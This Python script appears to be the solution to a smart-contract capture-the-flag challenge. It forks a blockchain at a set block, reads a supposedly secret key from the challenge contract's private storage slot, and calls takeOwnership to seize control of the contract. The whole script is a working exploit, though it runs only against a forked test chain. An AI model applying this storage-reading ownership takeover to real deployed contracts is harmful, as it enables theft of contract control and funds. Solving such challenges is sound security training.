from ape import accounts, Contract
from .utils.helper import fork, get_block, get_storage

BLOCK = 7156811
CHALLENGE_CONTRACT = "0x620E0c88E0f8F36bCC06736138bDEd99B6401192"


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # setting up attacker
    attacker = accounts.test_accounts[0]

    # fork chain at block height
    print(f"\n--- Forking chain at block height: {BLOCK} ---\n")
    fork(BLOCK)
    assert get_block() == BLOCK

    # get challenge contract
    print("\n--- Getting Challenge Contract ---\n")
    challenge = Contract(CHALLENGE_CONTRACT)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    secret_key = int(get_storage(challenge.address, 8), 0)
    challenge.takeOwnership(
        secret_key,
        sender=attacker,
        # max_fee="100 gwei",
    )

    # --- AFTER EXPLOIT --- #
    print("\n--- After exploit: You are now the owner of the contract ---\n")

    assert challenge.owner() == attacker.address

    print("\n--- 🥂 Challenge Completed! 🥂---\n")


if __name__ == "__main__":
    main()
